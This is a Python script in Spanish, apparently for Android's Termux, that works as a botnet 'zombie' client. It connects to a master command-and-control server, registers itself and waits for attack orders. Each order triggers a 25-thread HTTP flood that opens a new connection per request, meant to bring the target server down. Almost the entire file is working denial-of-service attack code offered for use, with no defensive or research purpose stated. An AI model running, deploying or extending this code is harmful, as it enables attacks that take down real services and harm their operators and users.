#!/data/data/com.termux/files/usr/bin/python3
"""
🤖 ZOMBIE FINAL - PARA MAESTRO TERMINAL
Ataque BRUTAL garantizado
"""

import socket
import threading
import time
import random
import sys

# Configuración
MASTER_IP = "192.168.1.10"  # CAMBIA ESTO
MASTER_PORT = 9999
ZOMBIE_ID = f"ANDROID_{random.randint(1000,9999)}"

# Colores para terminal
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    END = '\033[0m'

def log(msg):
    timestamp = time.strftime("%H:%M:%S")
    print(f"{Colors.BLUE}[{timestamp}]{Colors.END} {msg}")

def brutal_attack(target_ip, target_port, duration):
    """ATAQUE BRUTAL SIN SLEEP"""
    log(f"{Colors.RED}💀 INICIANDO ATAQUE BRUTAL{Colors.END}")
    log(f"🎯 Objetivo: {target_ip}:{target_port}")
    log(f"⏱️  Duración: {duration}s")
    
    end_time = time.time() + duration
    request_count = 0
    
    # PRE-COMPILAR REQUEST (más rápido)
    http_request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode()
    
    # CONTADOR COMPARTIDO
    counters = {'total': 0, 'errors': 0}
    
    def attacker_thread(thread_id):
        """Hilo de ataque individual"""
        local_count = 0
        while time.time() < end_time and counters['errors'] < 1000:
            try:
                # SOCKET NUEVO CADA REQUEST (más carga)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.05)  # 50ms timeout - MUY CORTO
                
                # CONECTAR Y ENVIAR
                s.connect((target_ip, target_port))
                s.send(http_request)
                s.close()
                
                local_count += 1
                counters['total'] += 1
                
                # SIN SLEEP - MÁXIMA VELOCIDAD
                # time.sleep(0)  # ¡CERO!
                
            except socket.timeout:
                counters['errors'] += 1
            except ConnectionRefusedError:
                log(f"{Colors.YELLOW}⚠️  ¡SERVIDOR SATURADO! Conexión rechazada{Colors.END}")
                counters['errors'] += 100  # Muchos errores = servidor caído
                break
            except:
                counters['errors'] += 1
        
        if local_count > 0:
            log(f"[Thread {thread_id}] {local_count} requests")
    
    # LANZAR 25 HILOS DE ATAQUE POR ZOMBIE
    log(f"{Colors.GREEN}🚀 Iniciando 25 hilos de ataque...{Colors.END}")
    
    threads = []
    for i in range(25):
        t = threading.Thread(target=attacker_thread, args=(i+1,))
        t.daemon = True
        threads.append(t)
        t.start()
    
    # MONITOREO
    start_time = time.time()
    while time.time() < end_time and any(t.is_alive() for t in threads):
        elapsed = time.time() - start_time
        if elapsed > 1:
            rps = counters['total'] / elapsed
            log(f"📊 {int(elapsed)}s: {counters['total']:,} reqs | {rps:,.0f} RPS")
        time.sleep(0)
    
    # FINALIZAR
    for t in threads:
        t.join(timeout=1)
    
    total_time = time.time() - start_time
    final_rps = counters['total'] / total_time if total_time > 0 else 0
    
    log(f"{Colors.GREEN}✅ ATAQUE COMPLETADO{Colors.END}")
    log(f"📈 Requests totales: {counters['total']:,}")
    log(f"❌ Errores: {counters['errors']:,}")
    log(f"⚡ RPS promedio: {final_rps:,.0f}")
    
    if counters['errors'] > counters['total'] * 0.5:
        log(f"{Colors.RED}🔥 ¡SATURACIÓN EXITOSA! Servidor probablemente caído{Colors.END}")
    else:
        log(f"{Colors.YELLOW}⚠️  Servidor resistente, considerar más bots{Colors.END}")
    
    return counters['total']

def connect_to_master():
    """Conexión principal al maestro"""
    log(f"{Colors.GREEN}🤖 ZOMBIE {ZOMBIE_ID} ACTIVADO{Colors.END}")
    log(f"🎯 Conectando a maestro: {MASTER_IP}:{MASTER_PORT}")
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((MASTER_IP, MASTER_PORT))
            
            # Enviar identificación
            sock.send(f"HELLO|{ZOMBIE_ID}|ANDROID\n".encode())
            
            # Recibir respuesta
            welcome = sock.recv(1024).decode()
            if "HELLO" in welcome:
                log(f"{Colors.GREEN}✅ CONECTADO AL MAESTRO{Colors.END}")
                log("🔄 Esperando órdenes de ataque...")
            
            # ESCUCHAR COMANDOS
            while True:
                try:
                    # Enviar ping periódico
                    sock.send(b"PING\n")
                    
                    # Recibir comandos
                    data = sock.recv(1024).decode().strip()
                    if not data:
                        break
                    
                    if data == "PONG":
                        pass  # Keep-alive normal
                    
                    elif data.startswith("ATTACK|"):
                        # ¡COMANDO DE ATAQUE!
                        parts = data.split("|")
                        if len(parts) >= 6:
                            _, target, port, duration, intensity, mode = parts
                            
                            log(f"{Colors.RED}🔥 ¡ORDEN DE ATAQUE RECIBIDA!{Colors.END}")
                            log(f"🎯 {target}:{port} por {duration}s")
                            log(f"💥 Intensidad: {intensity} RPS | Modo: {mode}")
                            
                            # Ejecutar ataque en hilo separado
                            attack_thread = threading.Thread(
                                target=brutal_attack,
                                args=(target, int(port), int(duration)),
                                daemon=True
                            )
                            attack_thread.start()
                            
                            # Reportar inicio
                            sock.send(f"REPORT|Attack started|{ZOMBIE_ID}\n".encode())
                    
                    # Pequeña pausa para no saturar
                    time.sleep(1)
                    
                except socket.timeout:
                    continue
                except:
                    break
            
            sock.close()
            log("🔌 Desconectado del maestro. Reconectando...")
            
        except ConnectionRefusedError:
            log(f"{Colors.RED}❌ No se puede conectar al maestro{Colors.END}")
            log("   Verifica IP y que el maestro esté ejecutándose")
        except Exception as e:
            log(f"{Colors.YELLOW}⚠️  Error: {str(e)[:50]}{Colors.END}")
        
        # Esperar antes de reconectar
        log("⏳ Intentando reconexión en 5 segundos...")
        time.sleep(5)

if __name__ == "__main__":
    # Verificar conexión de red
    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.settimeout(3)
        test_sock.connect(("8.8.8.8", 53))
        test_sock.close()
    except:
        log(f"{Colors.RED}❌ Sin conexión de red{Colors.END}")
        sys.exit(1)
    
    try:
        connect_to_master()
    except KeyboardInterrupt:
        log(f"{Colors.YELLOW}👋 Zombie terminado por usuario{Colors.END}")
    except Exception as e:
        log(f"{Colors.RED}💀 Error fatal: {e}{Colors.END}")
